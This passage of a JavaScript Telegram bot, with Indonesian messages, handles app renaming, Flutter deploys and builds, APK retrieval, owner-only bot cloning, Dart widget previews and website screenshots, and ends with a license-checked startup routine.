        if (state.step === 'WAIT_APP_OLD_NAME' && ctx.message.text) {
            const oldAppName = ctx.message.text.trim();
            userState[userId] = { ...state, step: 'WAIT_APP_NEW_NAME', oldAppName };
            return ctx.reply(
                `<blockquote>✅ Nama lama: <code>${oldAppName}</code>\n\nSekarang kirimkan <b>nama aplikasi BARU</b> yang diinginkan.\nContoh: <code>Super App</code></blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } }
            );
        }
        if (state.step === 'WAIT_APP_NEW_NAME' && ctx.message.text) {
            await processWithTimeout(ctx, () => handleRenameAppProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, true));
            return;
        }

        // ============================================================
        // CEK ERROR FUNC
        // ============================================================
        if (state.step === 'WAIT_ERRORFUNC_CODE' && ctx.message.text) {
            await handleCekErrorFuncProcess(ctx, state, userState);
            return;
        }

        // ============================================================
        // DEPLOY - DENGAN TIMEOUT
        // ============================================================
        if (state.step === 'WAIT_DEPLOY_ZIP' && ctx.message.document) {
            const MAX_SIZE = 2 * 1024 * 1024 * 1024;
            const fileSize = ctx.message.document.file_size || 0;
            if (fileSize > MAX_SIZE) {
                return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
            }
            await processWithTimeout(ctx, () => handleDeployProcess(ctx, state, userState, downloadTelegramFile));
            return;
        }

        // ============================================================
        // BUILD FLUTTER - DENGAN TIMEOUT
        // ============================================================
        if (state.step === 'WAIT_BUILD_ZIP' && ctx.message.document) {
            const MAX_SIZE = 2 * 1024 * 1024 * 1024;
            const fileSize = ctx.message.document.file_size || 0;
            if (fileSize > MAX_SIZE) {
                return ctx.reply(`<blockquote>❌ <b>File terlalu besar!</b>\n\nUkuran: ${(fileSize / 1024 / 1024).toFixed(1)} MB\nMaksimal: 2GB</blockquote>`, { parse_mode: 'HTML' });
            }
            await processWithTimeout(ctx, () => handleBuildProcess(ctx, state, userState, downloadTelegramFile, startBuildJob, false));
            return;
        }

        if (state.step === 'WAIT_BUILD_URL' && ctx.message.text) {
            await processWithTimeout(ctx, () => handleBuildProcess(ctx, state, userState, downloadTelegramFile, startBuildJob, true));
            return;
        }

        if (state.step === 'WAIT_STATUS_ID' && ctx.message.text) {
            const jobId = ctx.message.text.trim();
            delete userState[userId];
            const jobs = readJson(JOBS_FILE);
            const job = jobs[jobId];
            if (!job) {
                return ctx.reply(`<blockquote>❌ Job ID <code>${jobId}</code> tidak ditemukan.</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏗 Menu Build', callback_data: 'menu_build' }]] } });
            }
            const statusMsg = await ctx.reply(`<blockquote>📊 Mengambil status build...</blockquote>`, { parse_mode: 'HTML' });
            try {
                const run = await getRunById(job.run_id);
                const icon = run.status === 'completed' ? (run.conclusion === 'success' ? '✅' : '❌') : '⏳';
                await ctx.telegram.editMessageText(statusMsg.chat.id, statusMsg.message_id, undefined,
                    `<blockquote>📊 <b>STATUS BUILD</b>\n\nJob ID: <code>${jobId}</code>\nStatus: <b>${run.status}</b>${run.conclusion ? `\nHasil: <b>${run.conclusion}</b>` : ''}\n\n${icon}</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
                        [{ text: '📥 Ambil APK', callback_data: 'build_get_apk' }, { text: '🔙 Build Menu', callback_data: 'menu_build' }]
                    ]}}
                ).catch(() => {});
            } catch (e) {
                await ctx.telegram.editMessageText(statusMsg.chat.id, statusMsg.message_id, undefined,
                    `<blockquote>❌ Gagal cek status: ${e.message}</blockquote>`, { parse_mode: 'HTML' }).catch(() => {});
            }
            return;
        }

        if (state.step === 'WAIT_GETAPK_ID' && ctx.message.text) {
            const jobId = ctx.message.text.trim();
            delete userState[userId];
            const jobs = readJson(JOBS_FILE);
            const job = jobs[jobId];
            if (!job) {
                return ctx.reply(`<blockquote>❌ Job ID <code>${jobId}</code> tidak ditemukan.</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏗 Menu Build', callback_data: 'menu_build' }]] } });
            }
            const waitMsg = await ctx.reply(`<blockquote>⏳ Mengambil artifacts build...</blockquote>`, { parse_mode: 'HTML' });
            try {
                const artifacts = await getArtifacts(job.run_id);
                if (!artifacts || artifacts.length === 0) {
                    await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined,
                        `<blockquote>❌ Tidak ada artifact ditemukan.\nBuild mungkin belum selesai atau gagal.</blockquote>`,
                        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Build Menu', callback_data: 'menu_build' }]] } }
                    ).catch(() => {});
                    return;
                }
                const art = artifacts[0];
                const zipBuffer = await downloadArtifactZip(art.id);
                await ctx.telegram.deleteMessage(waitMsg.chat.id, waitMsg.message_id).catch(() => {});
                await sendDocumentSmart(
                    ctx, zipBuffer, `${jobId}_output.zip`,
                    { caption: `<blockquote>✅ <b>APK berhasil diunduh!</b>\n\nJob ID: <code>${jobId}</code></blockquote>`,
                      parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏠 Menu Utama', callback_data: 'main_menu' }]] } }
                );
            } catch (e) {
                await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined,
                    `<blockquote>❌ Gagal ambil APK: ${e.message}</blockquote>`, { parse_mode: 'HTML' }).catch(() => {});
            }
            return;
        }

        // ============================================================
        // JADIBOT
        // ============================================================
        if (state.step === 'WAIT_JADIBOT_TOKEN' && ctx.message.text) {
            const token = ctx.message.text.trim();
            if (!/^\d+:[A-Za-z0-9_-]{35,}$/.test(token)) {
                return ctx.reply('<blockquote>❌ Format token tidak valid!\nContoh: <code>1234567890:AAFxxx</code>\n\nCoba lagi kirimkan token yang benar.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
            }
            userState[userId] = { step: 'WAIT_JADIBOT_OWNERID', token };
            return ctx.reply(
                `<blockquote>✅ Token diterima!\n\n<b>Langkah 2:</b> Kirimkan <b>Owner ID</b> untuk bot baru ini.\nContoh: <code>123456789</code>\n\n📌 Cara cek ID: buka @userinfobot</blockquote>`,
                { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } }
            );
        }

        if (state.step === 'WAIT_JADIBOT_OWNERID' && ctx.message.text) {
            const ownerIdStr = ctx.message.text.trim();
            if (!/^\d+$/.test(ownerIdStr)) {
                return ctx.reply('<blockquote>❌ Owner ID harus berupa angka!\nContoh: <code>123456789</code></blockquote>', { parse_mode: 'HTML' });
            }
            const { token } = state;
            const newOwnerId = Number(ownerIdStr);
            delete userState[userId];
            const waitMsg = await ctx.reply('<blockquote>⏳ Memvalidasi token & mengaktifkan bot baru...</blockquote>', { parse_mode: 'HTML' });
            try {
                const getMeRes = await fetch(`https://api.telegram.org/bot${token}/getMe`);
                const getMeData = await getMeRes.json();
                if (!getMeData.ok) throw new Error('Token tidak valid atau bot tidak ditemukan di Telegram!');
                const botInfo = getMeData.result;

                if (activeClones[token]) {
                    try { await activeClones[token].stop('reclone'); } catch {}
                    delete activeClones[token];
                }
                const cloneBot = createBot(token, newOwnerId);
                activeClones[token] = cloneBot;
                cloneBot.launch().catch((e) => console.error(`❌ Gagal launch clone bot @${botInfo.username}:`, e.message));

                await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined,
                    `<blockquote>✅ <b>BOT BERHASIL DI-CLONE!</b>\n<i>Bot baru kamu sudah online</i></blockquote>\n\n<blockquote>🤖 <b>INFO BOT BARU</b>\n<b>Nama</b>       : ${botInfo.first_name}\n<b>Username</b>   : @${botInfo.username || '-'}\n<b>Owner ID</b>   : ${ownerIdStr}\n<b>Status</b>     : 🟢 ONLINE</blockquote>\n\n✨ <i>Bot barumu sudah aktif dengan fitur yang sama! Kirim /start ke bot baru untuk melihat menu.</i>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
                        [{ text: `🚀 Buka @${botInfo.username || 'bot'}`, url: `https://t.me/${botInfo.username || 'telegram'}` }],
                        [{ text: '🏠 Menu Utama', callback_data: 'main_menu' }]
                    ]}}
                ).catch(() => {});
                try {
                    await cloneBot.telegram.sendMessage(newOwnerId,
                        `<blockquote>⭐ <b>ASISTEN PADUKA YUZI</b>\n\n👋 Halo! Bot ini sudah aktif dan siap digunakan.\nKamu terdaftar sebagai Owner.\n\nKirim /start untuk mulai.</blockquote>`,
                        { parse_mode: 'HTML' }
                    );
                } catch {}
            } catch (e) {
                await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined,
                    `<blockquote>❌ Gagal clone bot:\n${e.message}</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Coba Lagi', callback_data: 'menu_jadibot' }, { text: '🏠 Menu', callback_data: 'main_menu' }]] } }
                ).catch(() => {});
            }
            return;
        }

        // ============================================================
        // DART PREVIEW
        // ============================================================
        if (state.step === 'WAIT_DART_PREVIEW_FILE') {
            const doc = ctx.message.document;
            if (!doc) {
                await ctx.reply(`<blockquote>⚠️ Kirim file <b>.dart</b> ya, bukan teks.\n\nKalau mau batal tekan tombol di bawah.</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
                return;
            }
            const fname = doc.file_name || '';
            if (!fname.endsWith('.dart')) {
                await ctx.reply(`<blockquote>❌ File harus berekstensi <b>.dart</b>!\n\nKirim file dart dari project Flutter kamu.</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
                return;
            }
            delete userState[userId];
            const waitMsg = await ctx.reply(
                `<blockquote>🧪 <b>Rendering widget...</b>\n\n📄 File: <code>${fname}</code>\n\n⏳ Kompilasi + screenshot, tunggu 15–30 detik ya...</blockquote>`,
                { parse_mode: 'HTML' }
            );
            try {
                const fileLink = await ctx.telegram.getFileLink(doc.file_id);
                const fileRes = await fetch(fileLink.href);
                const dartBuffer = Buffer.from(await fileRes.arrayBuffer());

                const result = await handleDartPreviewProcess(ctx, dartBuffer, fname);

                await ctx.telegram.deleteMessage(waitMsg.chat.id, waitMsg.message_id).catch(() => {});
                await ctx.replyWithPhoto(
                    { source: result.imageBuffer, filename: 'preview.png' },
                    {
                        caption: `<blockquote>🧪 <b>DART WIDGET PREVIEW</b>\n\n📄 File: <code>${fname}</code>\n✅ Berhasil dirender!\n\n🔗 Buka di DartPad untuk edit langsung.</blockquote>`,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔗 Buka di DartPad', url: result.embedUrl }],
                                [{ text: '🧪 Preview Lagi', callback_data: 'menu_dartpreview' }, { text: '🏠 Menu Utama', callback_data: 'main_menu' }]
                            ]
                        }
                    }
                );
            } catch (e) {
                await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined,
                    `<blockquote>❌ <b>Gagal preview dart:</b>\n\n${e.message}\n\n💡 Pastikan kode kamu valid Flutter widget ya.</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
                        [{ text: '🔄 Coba Lagi', callback_data: 'menu_dartpreview' }, { text: '🏠 Menu', callback_data: 'main_menu' }]
                    ]}}
                ).catch(() => {});
            }
            return;
        }

        // ============================================================
        // SSWEB
        // ============================================================
        if (state.step === 'WAIT_SSWEB_URL' && ctx.message.text) {
            let url = ctx.message.text.trim();
            delete userState[userId];
            if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'https://' + url;
            const waitMsg = await ctx.reply(`<blockquote>📸 Mengambil screenshot...\n🌐 <code>${url}</code>\n\n⏳ Mohon tunggu 10-20 detik...</blockquote>`, { parse_mode: 'HTML' });
            try {
                const ssApis = [
                    `https://image.thum.io/get/width/1280/crop/720/noanimate/${encodeURIComponent(url)}`,
                    `https://mini.s-shot.ru/1024x768/PNG/1024/Z1/?${encodeURIComponent(url)}`,
                ];
                let imgBuffer = null;
                for (const apiUrl of ssApis) {
                    try {
                        const res = await fetch(apiUrl, {
                            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                            signal: AbortSignal.timeout(25000),
                        });
                        if (res.ok) {
                            const ct = res.headers.get('content-type') || '';
                            if (ct.includes('image') || ct.includes('png') || ct.includes('jpeg')) {
                                const buf = Buffer.from(await res.arrayBuffer());
                                if (buf.length > 2000) { imgBuffer = buf; break; }
                            }
                        }
                    } catch {}
                }
                if (!imgBuffer) throw new Error('Gagal mengambil screenshot dari semua API. Cek URL atau coba lagi nanti.');
                await ctx.telegram.deleteMessage(waitMsg.chat.id, waitMsg.message_id).catch(() => {});
                await ctx.replyWithPhoto(
                    { source: imgBuffer, filename: 'screenshot.png' },
                    {
                        caption: `<blockquote>📸 <b>SCREENSHOT WEB</b>\n\n🌐 URL: <code>${url}</code>\n✅ Berhasil diambil!</blockquote>`,
                        parse_mode: 'HTML',
                        reply_markup: { inline_keyboard: [
                            [{ text: '🌐 Buka Website', url }],
                            [{ text: '📸 Screenshot Lagi', callback_data: 'menu_ssweb' }, { text: '🏠 Menu Utama', callback_data: 'main_menu' }]
                        ]}
                    }
                );
            } catch (e) {
                await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined,
                    `<blockquote>❌ Gagal screenshot:\n${e.message}</blockquote>`,
                    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
                        [{ text: '🔄 Coba Lagi', callback_data: 'menu_ssweb' }, { text: '🏠 Menu', callback_data: 'main_menu' }]
                    ]}}
                ).catch(() => {});
            }
            return;
        }
    } catch (e) {
        console.log('❌ Error di handler:', e.message);
        let errorMsg = e.message || 'Unknown error';
        if (errorMsg.includes('timeout') || errorMsg.includes('Timeout')) {
            errorMsg = '⏱️ Proses timeout - Coba dengan file yang lebih kecil. Maksimal 15 menit.';
        }
        await ctx.reply(
            `<blockquote>❌ <b>Terjadi kesalahan:</b>\n${errorMsg}\n\n💡 Silakan coba lagi dari menu.</blockquote>`,
            { parse_mode: 'HTML' }
        ).catch(() => {});
    }
});

// ============================================================
// JADIBOT — Clone bot via button (Owner only)
// ============================================================
bot.action('menu_jadibot', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    if (ctx.from.id !== OWNER_ID) {
        await ctx.reply('<blockquote>❌ Fitur ini hanya untuk Owner!</blockquote>', { parse_mode: 'HTML' });
        return;
    }
    userState[ctx.from.id] = { step: 'WAIT_JADIBOT_TOKEN' };
    const msg = `<blockquote>🤖 <b>JADIBOT — CLONE BOT</b>\n\nFitur ini membuat salinan bot kamu dengan token baru.\n\n<b>Langkah 1:</b> Kirimkan <b>Token Bot</b> baru kamu.\nContoh: <code>1234567890:AAFxxxxxxxxxxxxxxxxxxx</code>\n\n📌 Dapatkan token dari @BotFather</blockquote>`;
    const kb = { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] };
    try { await ctx.deleteMessage(); } catch {}
    await ctx.reply(msg, { parse_mode: 'HTML', reply_markup: kb });
});

// ============================================================
// PREVIEW DART
// ============================================================
bot.action('menu_dartpreview', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_DART_PREVIEW_FILE' };
    const msg = `<blockquote>🧪 <b>PREVIEW DART WIDGET</b>\n\nKirim 1 file <b>.dart</b> yang berisi class Widget (StatelessWidget/StatefulWidget).\n\nBot akan benar-benar me-render widget tersebut pakai Flutter (bukan AI tebak-tebakan), lalu mengirim hasilnya sebagai gambar 📱\n\n📌 <b>Catatan:</b>\n• File harus berisi widget Flutter yang valid\n• Kalau tidak ada <code>void main()</code>, bot otomatis wrap sendiri\n• Proses sekitar 15–30 detik\n\n⚡ Kirim file .dart sekarang.</blockquote>`;
    const kb = { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] };
    try { await ctx.deleteMessage(); } catch {}
    await ctx.reply(msg, { parse_mode: 'HTML', reply_markup: kb });
});

// ============================================================
// SSWEB
// ============================================================
bot.action('menu_ssweb', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_SSWEB_URL' };
    const msg = `<blockquote>📸 <b>SCREENSHOT WEB</b>\n\nFitur ini mengambil screenshot tampilan sebuah website.\n\n<b>Kirimkan URL website</b> yang ingin di-screenshot.\nContoh: <code>google.com</code> atau <code>https://example.com</code>\n\n⚡ Proses otomatis, hasil dikirim sebagai foto.</blockquote>`;
    const kb = { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] };
    try { await ctx.deleteMessage(); } catch {}
    await ctx.reply(msg, { parse_mode: 'HTML', reply_markup: kb });
});

return bot;
} // end createBot

// ============================================================
// STARTUP
// ============================================================
const mainBot = createBot(config.BOT_TOKEN, config.OWNER_ID);

(async () => {
    const licenseOk = await enforceLicense();
    if (!licenseOk) {
        console.error('🚫 Lisensi tidak valid / bypass terdeteksi. Bot tidak dijalankan.');
        process.exit(1);
    }

    startIntegrityWatcher(30000);
    startLicenseWatcher(() => {
        try { mainBot.stop('license_revoked'); } catch {}
        process.exit(1);
    }, 10 * 60 * 1000);

    initMtproto().catch(() => {});

    const MAX_RETRY = 10;
    let attempt = 0;
    while (attempt < MAX_RETRY) {
        try {
            await mainBot.launch();
            console.log('⭐ ASISTEN PADUKA YUZI — BOT AKTIF (PUBLIC MODE)');
            break;
        } catch (e) {
            attempt++;
            console.error(`❌ Gagal launch bot (percobaan ${attempt}/${MAX_RETRY}):`, e.message);
            if (attempt >= MAX_RETRY) {
                console.error('🚫 Bot gagal start setelah beberapa kali percobaan. Keluar.');
                process.exit(1);
            }
            await new Promise(r => setTimeout(r, 5000 * attempt));
        }
    }
})();

process.once('SIGINT', () => {
    mainBot.stop('SIGINT');
    try { stopDeveloperConsole(); } catch {}
    Object.values(activeClones).forEach(b => { try { b.stop('SIGINT'); } catch {} });
});
process.once('SIGTERM', () => {
    mainBot.stop('SIGTERM');
    try { stopDeveloperConsole(); } catch {}
    Object.values(activeClones).forEach(b => { try { b.stop('SIGTERM'); } catch {} });
});